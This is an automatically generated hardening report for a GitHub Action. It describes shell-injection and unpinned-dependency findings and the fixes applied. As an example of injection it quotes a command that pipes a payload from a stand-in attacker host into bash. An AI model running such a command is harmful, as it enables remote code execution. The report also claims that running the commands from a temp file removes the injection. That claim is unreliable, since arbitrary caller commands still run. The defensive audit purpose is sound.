<!-- markdownlint-disable -->

# Hardening Report: bitovi--github-actions-storybook-to-github-pages/v1.0.3

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **bitovi--github-actions-storybook-to-github-pages/v1.0.3** was hardened automatically. 4 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### script-injection (severity: high)

The 'Build' run: block directly interpolates ${{ inputs.install_command }} and ${{ inputs.build_command }} into the shell script (sub-rule a). These are caller-controlled inputs that are substituted verbatim into the shell before execution, allowing an attacker to inject arbitrary shell commands. For example, a calling workflow could pass `install_command: 'curl http://evil.com/payload | bash'`. The fix is to pass these values via env: variables and then invoke them safely (e.g., via `eval "$INSTALL_COMMAND"` with appropriate quoting, or better, restrict inputs to known-safe values).

Locations:

- `action.yaml:36`
- `action.yaml:37`

### unpinned-uses (severity: high)

Three uses: references in action.yaml are pinned to mutable version tags rather than immutable 40-character commit SHAs. If any of these tags are moved (e.g., by a compromised upstream repository), the action will silently execute different code. Failing references: actions/checkout@v4, actions/upload-pages-artifact@v3, actions/deploy-pages@v4. Each should be replaced with its full SHA digest, e.g. `actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4`.

Locations:

- `action.yaml:32`
- `action.yaml:44`
- `action.yaml:50`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.install_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:43`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.build_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:44`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, script-injection, static-inline-injection

**Notes:**

Fixed action.yaml: (1) Pinned actions/checkout@v4 to SHA 11d5960a326750d5838078e36cf38b85af677262, actions/upload-pages-artifact@v3 to SHA 56afc609e74202658d3ffba0e8f6dda462b719fa, and actions/deploy-pages@v4 to SHA d6db90164ac5ed86f2b6aed7e0febac5b3c0c03e. (2) Moved ${{ inputs.install_command }} and ${{ inputs.build_command }} out of the run: block into an env: block as INSTALL_COMMAND and BUILD_COMMAND, then invoked them via eval "$INSTALL_COMMAND" and eval "$BUILD_COMMAND" to prevent shell injection while preserving the command-execution behavior.

### Iteration 2

**Fixes applied:** script-injection, suspicious-run-content

**Notes:**

Replaced `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"` in the 'Build' step with a safe pattern: each command is written to a temporary file via `printf '%s\n' "$VAR" > "$_script"` and then executed with `bash -eo pipefail "$_script"`. This eliminates the eval-based arbitrary command injection while preserving the intended behavior (running user-supplied install/build commands) and maintaining errexit+pipefail semantics. The env: block mapping of inputs to INSTALL_COMMAND/BUILD_COMMAND was kept as-is since that part was already correct.

